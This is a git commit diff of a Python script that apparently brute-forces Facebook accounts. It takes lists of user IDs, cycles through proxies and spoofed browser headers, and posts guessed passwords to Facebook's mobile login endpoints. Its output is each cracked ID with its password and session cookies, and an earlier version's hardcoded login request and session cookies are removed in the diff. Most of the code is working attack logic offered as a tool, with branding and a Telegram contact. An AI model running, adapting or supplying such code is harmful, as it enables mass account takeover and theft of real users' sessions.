d0fd57b900348b6b8817837b0abeb84b45fafc7a
rawagaming <161049728+rawagaming@users.noreply.github.com>
2024-06-11 13:02:57 +0300

    Update shote_v1.py

--- shote_v1.py
+++ shote_v1.py
@@ -2,53 +2,6 @@
 from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
-cookies = {
-    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
-    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
-    'locale': 'fa_IR',
-    'vpd': 'v1%3B737x393x2.75',
-    'wd': '393x737',
-    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
-}
-
-headers = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
-    'origin': 'https://mbasic.facebook.com',
-    'referer': 'https://mbasic.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
-}
-
-params = {
-    'refid': '8',
-}
-
-data = {
-    'lsd': 'AVqAhQPrMiI',
-    'jazoest': '2963',
-    'uid': '100076526146833',
-    'flow': 'login_no_pin',
-    'next': '',
-}
-
-response = requests.post(
-    'https://mbasic.facebook.com/login/device-based/validate-pin/',
-    params=params,
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
 import urllib3,rich,base64
 from rich.table import Table as me
 from rich.console import Console as sol
@@ -224,29 +177,34 @@ def back():
 	login()
 #LOGO
 def banner():
-	print("""\x1b[1;37m
-                    
-, ＜￣｀ヽ、　　　　　　／￣＞
-　ゝ、　　＼　／⌒ヽ,ノ 　/´
-　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
-　　 　　>　 　 　,)
-　　　　　∠_,,,/ 
-
-                             CODE BY  : RUSSI
-                             Telegram : @kurd_kurd120
-                             Team     : Python
-                             Version  : G1🌺
- ╔╦══• •✠•❀ RUSSI-PRO ❀•✠ • •══╦╗
- ╚╩══• •✠•❀ RUSSI-PRO ❀•✠ • •══╩╝
+	print("""\x1b[38;5;208m
+⊂_ヽ
+     ＼＼
+         ＼( ͡° ͜ʖ ͡°)
+              >    ⌒ヽ
+            /      へ＼
+         /        /    ＼＼
+         ﾚ    ノ         ヽ_つ
+        /    /
+     /    /|
+    (    (ヽ
+    |    |、＼
+    | 丿 ＼ ⌒)
+    | |        ) /
+ノ )        Lﾉ
+(_／.
+           
+ 
+             ⭐️NEW UPDATE⭐️
 """)
 os.system('clear')
 banner()
 #MENU
 def menu():
 	
-	print(f'\x1b[1;92m1- CRACK FILE')
-	print(f'\x1b[1;93m2- CRACK ID')
-	print(f'\x1b[1;91m3- CRAETE FILE')
+	print(f'\x1b[38;5;8m1- CRACK FILE')
+	print(f'\x1b[38;5;8m2- CRACK ID')
+	print(f'\x1b[38;5;8m3- CRAETE FILE')
 	_____DYNO_____ = input('SERCH : ')
 	if _____DYNO_____ in ['1']:
 		F()
@@ -278,7 +236,7 @@ class D:
 			fileX = input ('NAEM FILE : ')
 			for line in open(fileX, 'r').readlines():
 				id.append(line.strip())
-			print(f'\x1b[1;93mCOLECTED ID : \x1b[1;93m'+str(len(id)))
+			print(f'\x1b[38;5;18mCOLECTED ID : \x1b[1;93m'+str(len(id)))
 			Settings()
 		except IOError:
 			print(" \x1b[1;91m\x1b[1;96m{H} \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
@@ -352,7 +310,7 @@ def dump_massal():
 		back()
 #SERVER-SETTING			
 def Settings():
-	print(f'\33[1;37m[ 1 ] Random = NEW +OLD')
+	print(f'\x1b[1;32m[ 1 ] Random = NEW +OLD')
 	hu = input('\33[1;37mSelect ∘ ')
 	if hu in ['0','00']:
 		muda=[]
@@ -372,7 +330,7 @@ def Settings():
 		exit()
 	os.system("clear");banner()
 	print('\33[1;37m------------------------------------------')
-	print(f'\33[1;37m[ 1 ] Method m.facebook ')
+	print(f'\x1b[38;5;166m[ 1 ] Method m.facebook ')
 	hc = input('\33[1;37mSelect ∘ ')
 	print('\33[1;37m------------------------------------------')
 	if hc in ['1','01']:
@@ -380,7 +338,7 @@ def Settings():
 	else:
 		methode.append('mobile')
 		print('\33[1;37m------------------------------------------')
-	pwplus=input('\33[1;37m[ 1 ] Auto Pass\n[ 2 ] Add Your Pass\n Select ∘ ')
+	pwplus=input('\x1b[1;37m[ 1 ] Auto Pass\n[ 2 ] Add Your Pass\n Select ∘ ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		print(f'Add Password Manual Minimam 6 Character')
@@ -479,7 +437,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[1;37m [ RUSSI-ZAMAN ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}OK{m}${H}{ok}{P}]  "),
+    sys.stdout.write(f"\r\x1b[1;31m [ RUSSI-RAWA💀 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}OK{m}${H}{ok}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -488,12 +446,42 @@ def crack(idf,pwv):
         try:
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
-            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            ses.headers.update({'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"iOS"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+})
             p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+            heade = {'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"iOS"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 #print(f'\r N I K O\n{K}[-CP]\n[✘] User : {idf} \n[✘] Pass : {pw}{N} ')
@@ -505,8 +493,8 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[RUSSI-OK]\033[1;96m   {idf} | \033[1;96m{pw} | \033[1;30m{kuki}')
-                os.system('espeak -a 300 " RUSSI CRACK   OK"')
+                print(f'\r\x1b[32[RUSSI-RAWA-OK]\033[1;96m   {idf} | \033[1;96m{pw} | \033[1;30m{kuki}')
+                os.system('espeak -a 300 "  CRACK   OK"')
                 cek_SURCHY(kuki)
                 break
                 
